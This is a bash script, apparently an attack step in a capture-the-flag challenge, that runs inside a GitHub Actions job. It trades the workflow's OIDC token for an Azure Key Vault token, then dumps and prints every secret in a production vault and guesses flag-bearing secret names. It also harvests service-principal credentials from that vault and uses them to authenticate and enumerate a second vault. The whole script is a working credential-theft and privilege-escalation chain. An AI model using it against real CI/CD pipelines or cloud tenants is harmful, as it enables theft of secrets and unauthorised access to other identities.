#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# List ALL secrets in kv-tbl-prod (might have new ones)
echo "=== kv-tbl-prod SECRETS (fresh list) ==="
curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[].id'

# Get EACH secret value
for S in $(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[].id'); do
  echo "--- $S ---"
  VAL=$(curl -s -H "Authorization: Bearer $KV" "$S?api-version=7.4" | jq -r .value)
  echo "$VAL" | head -c 200
  echo
  # Check if value contains flag
  echo "$VAL" | grep -o "DF26{[^}]*}" && echo "*** FLAG FOUND IN KV ***"
done

# Try guessing secret names that might contain flag
echo "=== GUESS FLAG SECRET NAMES ==="
for NAME in flag challenge-flag ctf-flag tebamoto-flag platform-flag config-storage-connection storage-key app-secret deployment-secret flag-9 challenge-9; do
  CODE=$(curl -s -o /tmp/sec.json -w "%{http_code}" -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$NAME?api-version=7.4")
  if [ "$CODE" = "200" ]; then
    echo "FOUND: $NAME = $(cat /tmp/sec.json | jq -r .value | head -c 200)"
  fi
done

# Try kv-tbl-sec with ALL SPs
echo "=== kv-tbl-sec SECRETS ==="
for SP in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  SPKV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
  if [ ${#SPKV} -gt 100 ]; then
    echo "--- $SP on kv-tbl-sec ---"
    SECS=$(curl -s -H "Authorization: Bearer $SPKV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
    echo "$SECS" | jq -r '.value[]?.id // empty' 2>/dev/null
    COUNT=$(echo "$SECS" | jq -r '.value | length' 2>/dev/null)
    echo "count: $COUNT"
    # Also try guessing secret names
    for NAME in flag challenge-flag ctf-flag config-storage-connection; do
      C=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $SPKV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$NAME?api-version=7.4")
      [ "$C" = "200" ] && echo "FOUND on sec: $NAME" && curl -s -H "Authorization: Bearer $SPKV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$NAME?api-version=7.4" | jq -r .value
    done
  fi
done

echo "=== DONE ==="
